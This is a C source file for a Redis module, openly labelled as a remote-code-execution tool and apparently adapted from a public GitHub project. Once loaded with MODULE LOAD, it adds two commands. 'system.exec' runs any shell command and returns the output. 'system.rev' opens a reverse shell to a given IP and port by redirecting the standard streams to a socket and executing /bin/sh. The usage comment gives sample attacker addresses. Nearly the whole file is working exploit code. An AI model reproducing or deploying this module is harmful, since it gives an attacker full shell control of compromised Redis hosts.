/*
 * Redis Command Execution Module (RCE via MODULE LOAD)
 * ----------------------------------------------------
 * Based on: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
 * Modified and corrected by: x7331
 *
 * This Redis module introduces two custom commands:
 *  - system.exec: Executes a shell command and returns its output.
 *  - system.rev : Opens a reverse shell to a specified IP and port.
 *
 * Usage (after MODULE LOAD):
 * 127.0.0.1:6379> system.exec "id"
 * 127.0.0.1:6379> system.rev "10.10.14.5" "4444"
 */

#include "redismodule.h"

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>

/*
 * system.exec
 * ----------
 * Executes a shell command provided as the first argument and returns
 * the command's output back to the Redis client.
 */
int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 2) {
        size_t cmd_len;
        size_t size = 1024;

        // Extract command string from Redis argument
        const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

        FILE *fp = popen(cmd, "r");
        if (!fp) {
            return RedisModule_ReplyWithError(ctx, "ERR failed to execute command");
        }

        // Allocate buffers for reading output
        char *buf = (char *)malloc(size);
        char *output = (char *)malloc(size);
        output[0] = '\0'; // Ensure null-termination

        // Read command output and concatenate into output buffer
        while (fgets(buf, size, fp) != NULL) {
            if (strlen(buf) + strlen(output) >= size) {
                size <<= 1;
                output = realloc(output, size);
            }
            strcat(output, buf);
        }

        RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
        RedisModule_ReplyWithString(ctx, ret);

        pclose(fp);
        free(buf);
        free(output);
    } else {
        return RedisModule_WrongArity(ctx);
    }

    return REDISMODULE_OK;
}

/*
 * system.rev
 * ----------
 * Establishes a reverse shell to the specified IP and port.
 * Arguments:
 *   argv[1] = IP address
 *   argv[2] = Port
 */
int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 3) {
        size_t cmd_len;

        // Parse IP and port from Redis arguments
        const char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
        const char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
        int port = atoi(port_s);

        int s;
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);
        sa.sin_port = htons(port);

        // Create socket and connect to remote listener
        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));

        // Redirect STDIN, STDOUT, STDERR to the socket
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        // Spawn shell
        char *const args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }

    return REDISMODULE_OK;
}

/*
 * RedisModule_OnLoad
 * ------------------
 * Registers the custom commands when the module is loaded into Redis.
 */
int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
